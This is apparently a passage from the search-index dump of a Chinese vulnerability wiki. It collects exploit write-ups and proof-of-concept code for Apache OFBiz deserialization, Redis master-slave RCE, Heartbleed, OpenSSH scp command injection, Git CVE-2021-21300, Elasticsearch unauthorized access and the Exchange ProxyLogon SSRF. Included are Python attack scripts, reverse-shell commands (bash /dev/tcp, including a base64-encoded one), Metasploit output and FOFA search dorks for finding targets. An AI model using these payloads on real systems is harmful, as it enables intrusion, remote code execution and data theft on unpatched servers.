\\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def trans(s): return \"%s\" % ''.join('%.2x' % x for x in s) def POC_1(target_url, Dnslog): popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', \"URLDNS\", Dnslog], stdout=subprocess.PIPE) data = popen.stdout.read() hex_data = trans(data) headers = { 'Content-Type': 'text/xml' } post_data = '''%s''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/webtools/control/SOAPService..... \\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[36m[o] 请检查 Dnslog 响应\\n \\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_1(target_url, Dnslog) [!NOTE] 反弹shell脚本 import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache OFBiz \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mHex_data >>> 在文件中修改 \\033[0m') print('+------------------------------------------') def POC_1(target_url, Dnslog): # java -jar ysoserial.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' hex_data = \"aced0xxxxxxxxxxxxxxxxxxxxxx678\" headers = { 'Content-Type': 'text/xml' } post_data = '''%s''' % hex_data vuln_url = target_url + \"/webtools/control/SOAPService\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=post_data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在请求 {}/webtools/control/SOAPService..... \\033[0m\".format(target_url)) if response.status_code == 200: print(\"\\033[36m[o] 请检查 监听地址 响应\\n \\033[0m\") else: print(\"\\033[31m[x] 请求失败 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url, Dnslog) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Zeppelin/":{"url":"book/Web服务器漏洞/Apache/Apache Zeppelin/","title":"Apache Zeppelin","keywords":"","body":"Apache Zeppelin Apache Zeppelin 未授权任意命令执行漏洞 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/Web服务器漏洞/Apache/Apache Zeppelin/Apache Zeppelin 未授权任意命令执行漏洞.html":{"url":"book/Web服务器漏洞/Apache/Apache Zeppelin/Apache Zeppelin 未授权任意命令执行漏洞.html","title":"Apache Zeppelin 未授权任意命令执行漏洞","keywords":"","body":"Apache Zeppelin 未授权任意命令执行漏洞 漏洞描述 Apache Zeppelin 存在未授权的用户访问命令执行接口，导致了任意用户都可以执行恶意命令获取服务器权限 漏洞影响 [!NOTE] Apache Zeppelin FOFA [!NOTE] icon_hash=\"960250052\" 漏洞复现 含有漏洞的页面如下 点击 创建一个匿名用户在用户页面执行命令即可 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/":{"url":"book/服务器应用漏洞/","title":"服务器应用漏洞","keywords":"","body":"服务器应用漏洞🦔 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Redis/":{"url":"book/服务器应用漏洞/Redis/","title":"Redis","keywords":"","body":"Redis Redis 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Redis/Redis 小于5.0.5 主从复制 RCE .html":{"url":"book/服务器应用漏洞/Redis/Redis 小于5.0.5 主从复制 RCE .html","title":"Redis <= 5.0.5 主从复制 RCE ","keywords":"","body":"Redis 漏洞描述 在2019年7月7日结束的WCTF2019 Final上，LC/BC的成员Pavel Toporkov在分享会上介绍了一种关于redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大 Pavel Toporkov的分享 影响版本 [!NOTE] Redis 环境搭建 docker pull damonevking/redis5.0 docker run -p 6379:6379 -d damonevking/redis5.0 redis-server nmap扫描一下6379端口开放即为搭建成功 root@kali:~/桌面# docker pull damonevking/redis5.0 Using default tag: latest latest: Pulling from damonevking/redis5.0 fc7181108d40: Pull complete 3e0ac67cad82: Pull complete 6ee495cb7235: Pull complete 9f7206d08b9d: Pull complete a8354ef8cccb: Pull complete 53afb10d81c2: Pull complete Digest: sha256:adcf62f378efe1187d2f72c6f0ecdf86ab2173a9e1c3c9f4fe4bb89060f5362f Status: Downloaded newer image for damonevking/redis5.0:latest docker.io/damonevking/redis5.0:latest root@kali:~/桌面# docker run -p 6379:6379 -d damonevking/redis5.0 redis-server 1275aa9c6c8f8ad0b6c8e58e609be6681acedec301b5593f7e8b0bd65f7fad12 root@kali:~/桌面# nmap 127.0.0.1 -p 6379 Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-08 21:47 CST Nmap scan report for localhost (127.0.0.1) Host is up (0.000099s latency). PORT STATE SERVICE 6379/tcp open redis Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds 漏洞复现 关于漏洞原理请查看Pavel Toporkov的分享 漏洞利用脚本: n0b0dyCN/redis-rogue-server ➜ ./redis-rogue-server.py -h ______ _ _ ______ _____ | ___ \\ | (_) | ___ \\ / ___| | |_/ /___ __| |_ ___ | |_/ /___ __ _ _ _ ___ \\ `--. ___ _ ____ _____ _ __ | // _ \\/ _` | / __| | // _ \\ / _` | | | |/ _ \\ `--. \\/ _ \\ '__\\ \\ / / _ \\ '__| | |\\ \\ __/ (_| | \\__ \\ | |\\ \\ (_) | (_| | |_| | __/ /\\__/ / __/ | \\ V / __/ | \\_| \\_\\___|\\__,_|_|___/ \\_| \\_\\___/ \\__, |\\__,_|\\___| \\____/ \\___|_| \\_/ \\___|_| __/ | |___/ @copyright n0b0dy @ r3kapig Usage: redis-rogue-server.py [options] Options: -h, --help show this help message and exit --rhost=REMOTE_HOST target host --rport=REMOTE_PORT target redis port, default 6379 --lhost=LOCAL_HOST rogue server ip --lport=LOCAL_PORT rogue server listen port, default 21000 --exp=EXP_FILE Redis Module to load, default exp.so -v, --verbose Show full data stream Example python3 redis-rogue-server.py --rhost 192.168.51.146 --lhost 192.168.51.146 --exp=exp.so 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/OpenSSL/":{"url":"book/服务器应用漏洞/OpenSSL/","title":"OpenSSL","keywords":"","body":"OpenSSL OpenSSL 心脏滴血漏洞 CVE-2014-0160 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/OpenSSL/OpenSSL 心脏滴血漏洞 CVE-2014-0160.html":{"url":"book/服务器应用漏洞/OpenSSL/OpenSSL 心脏滴血漏洞 CVE-2014-0160.html","title":"OpenSSL 心脏滴血漏洞 CVE-2014-0160","keywords":"","body":"OpenSSL 心脏滴血漏洞 CVE-2014-0160 漏洞描述 2014年4月7日，OpenSSL发布安全公告，在OpenSSL1.0.1版本至OpenSSL1.0.1f Beta1版本中存在漏洞，该漏洞中文名称为心脏滴血，英文名称为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。HeartBleed主要存在与OpenSSL的1.0.1版本到1.0.1f版本。 影响版本 [!NOTE] OpenSSL1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等版本 环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d 漏洞复现 使用Nmap检测脚本对目标进行检测 检测到心脏滴血漏洞，使用MSF对目标进行攻击 msf5 > use auxiliary/scanner/ssl/openssl_heartbleed msf5 auxiliary(scanner/ssl/openssl_heartbleed) > show options Module options (auxiliary/scanner/ssl/openssl_heartbleed): Name Current Setting Required Description ---- --------------- -------- ----------- DUMPFILTER no Pattern to filter leaked memory before storing LEAK_COUNT 1 yes Number of times to leak memory per SCAN or DUMP invocation MAX_KEYTRIES 50 yes Max tries to dump key RESPONSE_TIMEOUT 10 yes Number of seconds to wait for a server response RHOSTS yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:' RPORT 443 yes The target port (TCP) STATUS_EVERY 5 yes How many retries until key dump status THREADS 1 yes The number of concurrent threads (max one per host) TLS_CALLBACK None yes Protocol to use, \"None\" to use raw TLS sockets (Accepted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRES) TLS_VERSION 1.0 yes TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1, 1.2) Auxiliary action: Name Description ---- ----------- SCAN Check hosts for vulnerability msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set rhost 192.168.51.133 rhost => 192.168.51.133 msf5 auxiliary(scanner/ssl/openssl_heartbleed) > set verbose true verbose => true msf5 auxiliary(scanner/ssl/openssl_heartbleed) > run [*] 192.168.51.133:443 - Leaking heartbeat response #1 [*] 192.168.51.133:443 - Sending Client Hello... [*] 192.168.51.133:443 - SSL record #1: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 86 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 82 [*] 192.168.51.133:443 - Type: Server Hello (2) [*] 192.168.51.133:443 - Server Hello Version: 0x0301 [*] 192.168.51.133:443 - Server Hello random data: 5fd46996727a4e50c0e2eaecf52d1592384aaa6870d4d65eea8b6b34eb47a389 [*] 192.168.51.133:443 - Server Hello Session ID length: 32 [*] 192.168.51.133:443 - Server Hello Session ID: 66e9cacbefcb28955de31c38bd9dff93de153a6d6247fa117ebc3f2f091d6f74 [*] 192.168.51.133:443 - SSL record #2: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 822 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 818 [*] 192.168.51.133:443 - Type: Certificate Data (11) [*] 192.168.51.133:443 - Certificates length: 815 [*] 192.168.51.133:443 - Data length: 818 [*] 192.168.51.133:443 - Certificate #1: [*] 192.168.51.133:443 - Certificate #1: Length: 812 [*] 192.168.51.133:443 - Certificate #1: #, issuer=#, serial=#, not_before=2020-08-09 17:03:46 UTC, not_after=2021-08-09 17:03:46 UTC> [*] 192.168.51.133:443 - SSL record #3: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 331 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 327 [*] 192.168.51.133:443 - Type: Server Key Exchange (12) [*] 192.168.51.133:443 - SSL record #4: [*] 192.168.51.133:443 - Type: 22 [*] 192.168.51.133:443 - Version: 0x0301 [*] 192.168.51.133:443 - Length: 4 [*] 192.168.51.133:443 - Handshake #1: [*] 192.168.51.133:443 - Length: 0 [*] 192.168.51.133:443 - Type: Server Hello Done (14) [*] 192.168.51.133:443 - Sending Heartbeat... [*] 192.168.51.133:443 - Heartbeat response, 65535 bytes [+] 192.168.51.133:443 - Heartbeat response with leak, 65535 bytes [*] 192.168.51.133:443 - Printable info leaked: ......_...DV.\\....G...{.vc..i ..Gv.'....f.....\".!.9.8.........5.............................3.2.....E.D...../...A.......................................w.....#.'.g.@.r.v.........8.........2.....E.D.......Q.......P.=...ServiceInstanceW&V.b...?....|.y..................................................................................................................................... repeated 15479 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.................................................................................................................................................................................................................................................................................................................................QA......h.......h.........7.RV....7.RV..................................................................................................................................... repeated 4129 times .....................................................................................................................................0......X.......X.........................7.RV..............................RV..=.c.RV.. .7.RV..x.7.RV....7.RV....7.RV..x.7.RV..x.7.RV..h.7.RV....7.RV....7.RV..192.168.51.146 - - [12/Dec/2020:06:47:40 +0000] \"POST /sdk HTTP/1.1\" 404 170 \"-\" \"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)\".org/book/nse.html)\"..................................................................................................................................... repeated 3184 times .....................................................................................................................................Q ........................7.RV....7.RV..................................................................................................................................... repeated 7539 times`.......0........$4.RV..jfx...&...~.RV..........PA......`....... '..RV..@d4.RV....................2.RV....................2.RV..........................1.................8.RV..........................1...............................................!...............h....... ...............m..U`.W.....O.>c.....E^X4........kr[..:.1...z[..x.W].........f...3h.qS.&K.(A*q*...].tx.b....X........Np....l.F...5....~..Z2.D..$........................................................................................................................................1.......x.......x.......P.2.RV....2.RV..0.......0.......>#NQ[.8.].......&.i2y.x.I....iOk........a....... '..RV..`.2.RV..................0.2.RV....................2.RV......................;P.e.........................U.6.&`.Ks..w>V.. ^..N..z....z...M.+..n/i..C...D......a..2.p.....I5.F......!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I................................................................................................................................................................................................................................................................................ '..RV.. .8.RV..`.2.RV....................8.RV.................................. .2.RV....................2.RV............................................2.RV....................2.RV.......................... .2.RV.. .2.RV..................h.......h.........8.RV....8.RV..................................................................................................................................... repeated 745 times .....................................................................................................................................#8.RV..`.2.RV........!.3Xhy.4.....r.....h.d..b........).......3.....&......IE...c,8.T.~..H.P.{y.....CK.,!&..;..vw....H.C...q....%e..{.XT.jq.R.r.....RHw..57.COlB..|......@...*.G(3..-N..P....mLO..]./.,9..|..+2.Lh..q..dF.m...'.....`...S.8........Q...U.0....I ..................................................................................................................................... repeated 277 times .....................................................................................................................................X.......`repeated 437 timesrepeated 429 times .....................................................................................................................................x.......!.......X.......X..................................................................................................................................... repeated 1942 times .....................................................................................................................................@..........V...R.._.i.rzNP.....-..8J.hp..^..k4.G.. f.....(.]..8......:mbG..~.?/..ot...................6...2../..,0..(0...........j..0...*.H........0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0...200809170346Z..210809170346Z0V1.0...U....US1.0...U....Denial1.0...U....Springfield1.0...U....Dis1.0...U....localhost0..\"0...*.H.............0.........8...;....../t.....^.....P..=....w.*b.a>.8.Q.?.$.c.......{G. ........l..i...D..V....0......B..J..Y.c.wO.....M.Df..R....\".4.u...............P.>.c..|.s(......,..H.1..0.=l`...(2..Sb.......`...c....5J....v..uj.*^i.$6^..a3.s.......v...\\....M.pK.9....t.&...|y...u1.......u..M..%.+..{e....G..~.v.D.6...............=).3{......r/.\"vz..a.U..5-.5.=......l..ud......Nx...n..$h...4.G.~b.LU.Y...37..e....%.w.......K...G...A....~m.h,......qz>}uA.^)..A.&}o@..'...y.]..V..S..JY........Y/.u|....$.n.T._.b\\\\c...o.]....L.h...v*....z..D..?Kq9hJ.kT....?.....=......su....p.S...j.e.....-N}.S...x..Z.....t.;Z...n=.1.......J.1n.l...w. .l.d.W. .........8..`.>O........t...r..~.A$..R...v.8......x.\\o 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/OpenSSH/":{"url":"book/服务器应用漏洞/OpenSSH/","title":"OpenSSH","keywords":"","body":"OpenSSH OpenSSH 命令注入漏洞 CVE-2020-15778 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/OpenSSH/OpenSSH 命令注入漏洞 CVE-2020-15778.html":{"url":"book/服务器应用漏洞/OpenSSH/OpenSSH 命令注入漏洞 CVE-2020-15778.html","title":"OpenSSH 命令注入漏洞 CVE-2020-15778","keywords":"","body":"OpenSSH 命令注入漏洞 CVE-2020-15778 漏洞描述 2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。深信服安全研究团队依据漏洞重要性和影响力进行评估，作出漏洞通告。 漏洞影响 [!NOTE] OpenSSH 漏洞复现 [!NOTE] 可用于目标不允许远程登录但SCP开启的情况下远程命令执行 攻击机创建 peiqi.txt ，利用 scp上传文件 到 /tmp 目录下 执行命令 ping dnslog 反弹shell 更换命令即可 /bin/bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Elasticsearch/":{"url":"book/服务器应用漏洞/Elasticsearch/","title":"Elasticsearch","keywords":"","body":"Elasticsearch Elasticsearch 未授权访问 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Elasticsearch/Elasticsearch 未授权访问.html":{"url":"book/服务器应用漏洞/Elasticsearch/Elasticsearch 未授权访问.html","title":"Elasticsearch 未授权访问","keywords":"","body":"Elasticsearch 未授权访问 漏洞描述 Elasticsearch是用Java开发的企业级搜索引擎，默认端口9200，存在未授权访问漏洞时，可被非法操作数据 漏洞影响 [!NOTE] Elasticsearch 漏洞复现 访问目标URL : http://xxx.xxx.xxx.xxx:9200/_node http://localhost:9200/_cat/indices http://localhost:9200/_river/_search //查看数据库敏感信息 http://localhost:9200/_nodes //查看节点数据 http://localhost:9200/_plugin/head/ //web管理界面(head插件) 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Git/":{"url":"book/服务器应用漏洞/Git/","title":"Git","keywords":"","body":"Git Git for Visual Studio远程执行代码漏洞 CVE-2021-21300 Git-LFS 远程命令执行漏洞 CVE-2020-27955 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Git/Git for Visual Studio远程执行代码漏洞 CVE-2021-21300.html":{"url":"book/服务器应用漏洞/Git/Git for Visual Studio远程执行代码漏洞 CVE-2021-21300.html","title":"Git for Visual Studio远程执行代码漏洞 CVE-2021-21300","keywords":"","body":"Git for Visual Studio远程执行代码漏洞 CVE-2021-21300 漏洞描述 此漏洞影响具有不区分大小写的文件系统的平台，当某些过滤器被使用时（例如Git LFS）。Git可能会被欺骗运行克隆期间的远程代码。 漏洞影响 [!NOTE] v2.17.6，v2.18.5，v2.19.6，v2.20.5，v2.21.4， v2.22.5，v2.23.4，v2.24.4，v2.25.5，v2.26.3，v2.27.1，v2.28.1，v2.29.3， v2.30.2。 漏洞复现 暂无复现 参考文章: https://www.openwall.com/lists/oss-security/2021/03/09/3 漏洞利用POC #!/bin/sh git init delayed-checkout && ( cd delayed-checkout && echo \"A/post-checkout filter=lfs diff=lfs merge=lfs\" \\ >.gitattributes && mkdir A && printf '#!/bin/sh\\n\\necho PWNED >&2\\n' >A/post-checkout && chmod +x A/post-checkout && >A/a && >A/b && git add -A && rm -rf A && ln -s .git/hooks a && git add a && git commit -m initial ) && git clone delayed-checkout cloned 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Git/Git-LFS 远程命令执行漏洞 CVE-2020-27955.html":{"url":"book/服务器应用漏洞/Git/Git-LFS 远程命令执行漏洞 CVE-2020-27955.html","title":"Git-LFS 远程命令执行漏洞 CVE-2020-27955","keywords":"","body":"Git-LFS 远程命令执行漏洞 CVE-2020-27955 漏洞描述 Git LFS 是 Github 开发的一个 Git 的扩展，用于实现 Git 对大文件的支持 一些受影响的产品包括Git，GitHub CLI，GitHub Desktop，Visual Studio，GitKraden，SmartGit，Sourcetree等 该漏洞影响仅windows平台 漏洞影响 [!NOTE] Git-LFS（git-lfs） 漏洞复现 运行下列的命令，如果版本在影响范围则会弹出计算器 git clone https://github.com/r00t4dm/CVE-2020-27955 漏洞POC https://github.com/r00t4dm/CVE-2020-27955 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Microsoft Exchange/":{"url":"book/服务器应用漏洞/Microsoft Exchange/","title":"Microsoft Exchange","keywords":"","body":"Microsoft Exchange Microsoft Exchange SSRF漏洞 CVE-2021-26885 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Microsoft Exchange/Microsoft Exchange SSRF漏洞 CVE-2021-26885.html":{"url":"book/服务器应用漏洞/Microsoft Exchange/Microsoft Exchange SSRF漏洞 CVE-2021-26885.html","title":"Microsoft Exchange SSRF漏洞 CVE-2021-26885","keywords":"","body":"Microsoft Exchange SSRF漏洞 CVE-2021-26885 漏洞描述 Exchange Server 是微软公司的一套电子邮件服务组件，是个消息与协作系统。2021年03月3日，微软官方发布了Microsoft Exchange安全更新，披露了多个高危严重漏洞，其中：在 CVE-2021-26855 Exchange SSRF漏洞中，攻击者可直接构造恶意请求，以Exchange server的身份发起任意HTTP请求，扫描内网，并且可获取Exchange用户信息。该漏洞利用无需身份认证 漏洞影响 [!NOTE] Exchange 2013 Versions Exchange 2016 CU18 Exchange 2016 CU19 Exchange 2019 CU7 Exchange 2019 CU8 FOFA [!NOTE] icon_hash=\"1768726119\" 漏洞复现 与 SSRF 有关的文件 /owa/auth/Current/themes/resources/logon.css /owa/auth/Current/themes/resources/... /ecp/default.flt /ecp/main.css /ecp/.js 查看补丁中的改变，可以看到有关 BackEndServer 使用的类关于 BEResourceRequestHandler 的改变 修复 BEResourceRequestHandler 使用的 BakcEndServer类的补丁 查看调用BERsourceRequestHandler 的方法 SelectHandlerForUnauthenticatedRequest 查找相关路径 ProxyMoudle 可以从中看到需要带有 EXP协议(例如路径 /ecp/), Cookie参数 X-BEResponse, 还有以静态扩展名结尾的 URL (例如 x.js, x.css等) 而其中的请求为 HttpProxy 来实现的，所以大部分的POC中请求的文件为/etc/y.js 这样类似不存在的文件 参数 X-BEResource 解析在 BackEndServer.FromString 跟踪 BackEndServer对象， 其中该对象使用 ProxyRequestHandler 向主机发送请求 这里进行SSRF的漏洞复现，首先访问 /ecp/PeiQi.js 文件 并设置Cookie X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true GET /ecp/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true 用这样的方式请求可以确定是否存在 SSRF漏洞 响应包为: NegotiateSecurityContext failed with for host 'peiqi_wiki' with status 'TargetUnknown' 显示这样的就是可能存在了 在通过发送一个请求给 Dnslog确认是否存在 SSRF给 Dnslog发送了一个请求 GET /owa/auth/PeiQi.js HTTP/1.1 Host: xxx.xxx.com Connection: close sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: no-cors Sec-Fetch-Dest: image Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; [!NOTE] Cookie: X-AnonResource=true; X-AnonResource-Backend=ianqsx.dnslog.cn/ecp/default.flt?~3; X-BEResource=ianqsx.dnslog.cn/owa/auth/logon.aspx?~3; 将其中的 Dnslog换成自己的 确定收到了由服务端发送的请求，存在SSRF漏洞 漏洞利用POC import requests import sys import random import re import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Microsoft Exchange多个版本 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> mail.xxx.xxx.xxx \\033[0m') print('+ \\033[36mDnslog >>> xxxx.dnslog.cn \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = \"https://\" + target_url + \"/ecp/PeiQi.js\" headers = { 'Cookie': 'X-BEResource=peiqi_wiki/api/endpoint#~1; X-AnonResource=true' } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) if response.status_code == 500 and 'NegotiateSecurityContext' in response.text and 'peiqi_wiki' in response.text: print(\"\\033[32m[o] 目标 {} 存在SSRF漏洞， 输入Dnslog地址进一步检测....\\033[0m\".format(target_url)) dnslog = str(input(\"\\033[35mDnslog >>> \\033[0m\")) POC_2(target_url, dnslog) else: print(\"\\033[31m[x] 目标 {} 不存在SSRF漏洞 \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) def POC_2(target_url, dnslog): vuln_url = \"https://\" + target_url + \"/owa/auth/PeiQi.js\" headers = { 'Cookie': 'X-AnonResource=true; X-AnonResource-Backend={}/ecp/default.flt?~3; X-BEResource={}/owa/auth/logon.aspx?~3;'.format(dnslog, dnslog) } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[32m[o] 请查看 Dnslog：{} 响应....\\033[0m\".format(dnslog)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) Goby & POC [!NOTE] Microsoft Exchange SSRF漏洞 CVE-2021-26885 稻草人安全漏洞库 all right reserved，powered by Gitbook文件更新时间： 2021-07-21 13:48:08 "},"book/服务器应用漏洞/Microsoft Exchange/Microsoft Exchange 远程命令执行 CVE-2021-27065 26857 26858 27065.html":{"url":"book/服务器应用漏洞/Microsoft Exchange/Microsoft Exchange 远程命令执行 CVE-2021-27065 26857 26858 27065.html","title":"Microsoft Exchange 远程命令执行 CVE-2021-27065 26857 26858 27065","keywords":"","body":"Microsoft Exchange 远程命令执行 CVE-2021-26855/26857/26858/27065 漏洞描述 Microsoft Exchange Server 是个消息与协作系统。Exchange Server可以被用来构架应用于企业、学校的邮件系统或免费邮件系统。2021年03月03日微软官方披露多个Exchange高危漏洞： CVE-2021-26855 Exchange服务器端请求伪造漏洞。利用此漏洞的攻击者能够以Exchange Server发送HTTP请求，扫描内网，获取Exchange用户信息。 CVE-2021-26857 Exchange反序列化漏洞。该漏洞需要管理员权限，攻击者通过构造恶意请求，触发反序列化漏洞，在服务器上执行恶意代码。 CVE-2021-26858/CVE-2021-27065 Exchange中身份验证后的任意文件写入漏洞。攻击者可以通过CVE-2021-26855的ssrf漏洞获取到的Exchange administrator凭证，构造恶意请求，在系统上写入任意文件。 漏洞影响 [!NOTE] Exchange 2013 Versions Exchange 2016 CU18 Exchange 2016 CU19 Exchange 2019 CU7 Exchange 2019 CU8 FOFA [!NOTE] icon_hash=\"1768726119\" 漏洞复现 4篇关于原理的参考文章 https://www.praetorian.com/blog/reproducing-proxylogon-exploit/ https://www.crowdstrike.com/blog/falcon-complete-stops-microsoft-exchange-server-zero-day-exploits/ https://www.volexity.com/blog/2021/03/02/active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities/ https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/ [!NOTE] 其中一次攻击中的日志 